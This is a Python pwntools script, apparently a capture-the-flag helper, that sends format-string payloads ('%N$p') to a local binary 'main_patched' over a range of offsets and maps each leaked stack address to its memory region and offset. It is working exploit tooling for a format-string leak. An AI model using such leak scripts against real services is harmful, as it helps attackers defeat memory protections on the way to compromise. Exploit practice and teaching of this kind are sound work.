from pwn import *
import sys

exe = ELF("./main_patched", checksec=False)

def conn() -> pwnlib.tubes.process.process:
	with context.local(log_level='warn'):
		r = process(exe.path)
		return r

def close(r: pwnlib.tubes.process.process):
	with context.local(log_level='error'):
		r.close()

def leakStack(offset: int) -> bytes:
	return f"%{offset}$p".encode('utf-8')

def findOffset(maps: list, sectionName: str, address: int) -> int:
	for section in maps:
		start = section.start
		path = section.path
		if path == sectionName:
			return address - start
	return -1

def findInteresting(maps: list, address: bytes, index: int) -> int:
	if b"(nil)" in address:
		return 0
	try:
		addr = int(address,16)
	except Exception:
		return 1
	isInteresting = False
	for section in maps:
		start = section.start
		end = section.end
		perms = section.perms.string
		path = section.path
		if '/' in path:
			fpath = path.split('/')[-1]
		else:
			fpath = path
		if addr >= start and addr <= end:
			if "[anon]" in path:
				continue
			if not isInteresting:
				print(f"[{index}] {hex(addr)}:")
				isInteresting = True
			print(f"\t{fpath} (", end="")
			offset = findOffset(maps, path, addr)
			if offset == -1:
				print("n/a)")
			else:
				print(f"offset: {hex(offset)})")
	return 0

def main(start: int, stop: int):
	i = start
	while i <= stop:
		r = conn()

		# recv until the input area
		r.recvuntil(b'\n')

		maps = r.maps()

		# send leakStack(i)
		r.sendline(b'AAAAAA----'+leakStack(i))
		r.recvuntil(b'----',timeout=1)
		addr = r.recvline(timeout=1)
		if findInteresting(maps, addr, i):
				print("### Error. Retrying... ###")
				i = i-1
		close(r)
		i = i + 1

if __name__ == "__main__":
	if len(sys.argv) < 3:
		print(f"Usage: {sys.argv[0]} [start] [stop]",file=sys.stderr)
		exit(1)
	start = int(sys.argv[1])
	stop = int(sys.argv[2])
	if start < 1 or stop < start:
		print("Invalid start-stop bounds", file=sys.stderr)
		exit(2)
	context.log_level = 'error'
	main(start,stop)
